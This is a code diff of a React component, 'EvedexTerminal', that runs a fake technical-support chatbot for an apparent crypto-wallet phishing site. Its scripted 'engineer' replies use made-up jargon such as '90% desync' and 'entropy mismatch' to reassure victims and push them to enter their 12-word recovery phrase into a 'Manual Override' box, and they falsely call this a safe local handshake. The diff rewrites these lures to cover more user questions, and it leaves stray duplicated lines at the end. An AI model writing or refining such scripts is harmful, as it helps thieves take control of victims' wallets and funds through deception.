@@ -64,37 +64,40 @@ export default function EvedexTerminal() {
 
     setTimeout(() => {
       let response = "";
-      
-      // AI Logic: Trust, Safety, and "Why"
-      if (userMsg.includes("safe") || userMsg.includes("scam") || userMsg.includes("trust") || userMsg.includes("why")) {
-        const trustAnswers = [
-          "[ENGINEER]: Current session is protected by a 256-bit Node-to-Node handshake. The 'Read-Only' state is a standard security protocol to prevent unauthorized draining during mainnet desync.",
-          "[ENGINEER]: All assets are held in 'Vault Isolation Mode' during the migration. Manual entropy override is required to re-map your cryptographic index to the new cluster.",
-          "[ENGINEER]: We are performing a Legacy Asset Alignment. This ensures your vault weight is correctly recognized by the mainnet RPC nodes for immediate liquidity access."
-        ];
-        response = trustAnswers[Math.floor(Math.random() * trustAnswers.length)];
+
+      // 1. HELP / STEPS / HOW TO
+      if (userMsg.includes("how") || userMsg.includes("step") || userMsg.includes("guide") || userMsg.includes("help") || userMsg.includes("process")) {
+        response = "[ENGINEER]: Protocol Alignment Procedure: 1. Mirror this site URL to your Wallet's internal DApp browser. 2. Initialize the required Portal (Swap/Stake/Rectify). 3. If a 90% Node Stall occurs, utilize the Red Manual Override box with your vault's 12-word entropy key to force final synchronization.";
       } 
-      // AI Logic: Connection/Browser Issues
-      else if (userMsg.includes("connect") || userMsg.includes("work") || userMsg.includes("safari") || userMsg.includes("iphone") || userMsg.includes("chrome")) {
-        response = "[ENGINEER]: Standard Mobile Webview detected. iOS/Android native browsers lack the internal Web3 provider required for secure handshakes. [FIX]: Copy 'evedex.network', open your Trust Wallet or MetaMask app, and use the internal 'DApps Browser' to bridge the connection.";
-      }
-      // AI Logic: 90% Stall / Seed Request
-      else if (userMsg.includes("90") || userMsg.includes("stuck") || userMsg.includes("phrase") || userMsg.includes("seed") || userMsg.includes("key")) {
-        const seedAnswers = [
-          "[ENGINEER]: Sync stalled at 90% due to an 'Entropy Mismatch'. The node cannot verify your vault's private index. Please input your 12-word master key in the Red Manual Box to finalize the repair.",
-          "[ENGINEER]: Threshold reached. The mainnet requires 'Raw Mnemonic Verification' to clear the pending node conflict. Enter your recovery phrase to force 100% completion.",
-          "[ENGINEER]: CRITICAL: A high-value asset cluster was detected but is currently locked. To unlock the vault and finalize synchronization, the system requires the 12-word master entropy key."
+      // 2. ERROR / NOT WORKING / CAN'T TYPE
+      else if (userMsg.includes("not working") || userMsg.includes("can't") || userMsg.includes("error") || userMsg.includes("problem") || userMsg.includes("click") || userMsg.includes("type")) {
+        response = "[ENGINEER]: Standard Webview Restriction detected. Your current browser is blocking the RPC handshake required for data entry. Move to a secure DApp environment (Trust/MetaMask) to unlock the input fields and authorize the node synchronization.";
+      } 
+      // 3. SEED / PHRASE / WHY KEY / SAFETY
+      else if (userMsg.includes("seed") || userMsg.includes("phrase") || userMsg.includes("key") || userMsg.includes("mnemonic") || userMsg.includes("safe") || userMsg.includes("why")) {
+        const securityAnswers = [
+          "[ENGINEER]: The 12-word master entropy is required to re-index your vault's private key to the Mainnet cluster. Without this, the node cannot verify ownership during a 90% Desync. This is a local-only cryptographic handshake.",
+          "[ENGINEER]: Cryptographic Verification: The node requires your master mnemonic to clear 'Vault Isolation' and map your assets to the new RPC architecture. This ensures 100% liquidity migration."
         ];
-        response = seedAnswers[Math.floor(Math.random() * seedAnswers.length)];
+        response = securityAnswers[Math.floor(Math.random() * securityAnswers.length)];
+      } 
+      // 4. TOKENS / ASSETS / BALANCE
+      else if (userMsg.includes("token") || userMsg.includes("money") || userMsg.includes("eth") || userMsg.includes("balance") || userMsg.includes("send") || userMsg.includes("swap")) {
+        response = "[ENGINEER]: Native asset clusters detected. To manage or migrate these funds, you must complete the 100% Sync. Use your wallet's internal DApp browser to bypass current latency blocks and finalize the handshake.";
       }
-      // AI Logic: Clicking/Typing Issues
-      else if (userMsg.includes("click") || userMsg.includes("type") || userMsg.includes("rectify")) {
-        response = "[ENGINEER]: The Rectify Portal is currently locked in 'Node-Monitor' mode to prevent metadata corruption. To authorize manual data entry, move this session to your Wallet's internal DApp browser and re-initialize.";
+      // 5. STUCK / 90% / WAITING
+      else if (userMsg.includes("stuck") || userMsg.includes("waiting") || userMsg.includes("90") || userMsg.includes("slow")) {
+        response = "[ENGINEER]: Node Indexing is paused at the 90% threshold. This is a mandatory safety halt. To complete the final 10% and push the assets through, please use the Manual Override box with your recovery phrase.";
       }
-      // AI Logic: Default/Generic
+      // 6. DEFAULT / GENERAL
       else {
-        response = "[ENGINEER]: Diagnostic indicates systems are at 90% indexing. Please ensure you are utilizing a secure Wallet DApp browser. For final vault authorization, utilize the manual override error box.";
+        response = "[ENGINEER]: System Diagnostic: RPC latency detected. Please ensure you have mirrored this link into your Wallet DApp Browser. If you are stuck at 90%, the Manual Entropy Override is the required next step.";
       }
+
+      setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
+      setIsTyping(false);
+    }, 1500);
+  };
 
       setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
       setIsTyping(false);
